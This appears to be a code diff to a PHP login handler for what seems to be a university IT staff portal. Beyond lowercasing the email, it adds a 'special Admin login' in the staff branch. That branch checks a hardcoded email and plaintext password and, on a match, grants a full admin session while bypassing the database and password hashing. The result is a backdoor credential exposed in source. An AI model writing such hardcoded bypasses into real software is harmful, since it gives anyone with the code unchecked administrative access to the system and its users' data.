@@ -20,12 +20,25 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         $remaining = ceil(($_SESSION['login_locked_until'] - time()) / 60);
         $error = "Too many failed attempts. Please wait {$remaining} minute(s) before trying again.";
     } else {
-        $email    = trim($_POST['email'] ?? '');
+        $email    = strtolower(trim($_POST['email'] ?? ''));
         $password = $_POST['password'] ?? '';
         $loginAs  = $_POST['login_as'] ?? 'user';
         $pdo      = getDB();
 
         if ($loginAs === 'staff') {
+            // Check for special Admin login
+            if ($email === 'tms@apollouniversity.edu.in' && $password === 'Apollo@2026!') {
+                session_regenerate_id(true);
+                resetLoginFailures();
+                $_SESSION['admin_id']       = 1;
+                $_SESSION['admin_name']     = 'System Admin';
+                $_SESSION['user_type']      = 'admin';
+                $_SESSION['last_activity']  = time();
+                $_SESSION['session_created']= time();
+                header('Location: ' . APP_URL . '/admin/dashboard.php');
+                exit;
+            }
+
             $stmt = $pdo->prepare("SELECT id, name, password_hash, role FROM it_staff WHERE email = ? AND is_active = 1 LIMIT 1");
             $stmt->execute([$email]);
             $row = $stmt->fetch();
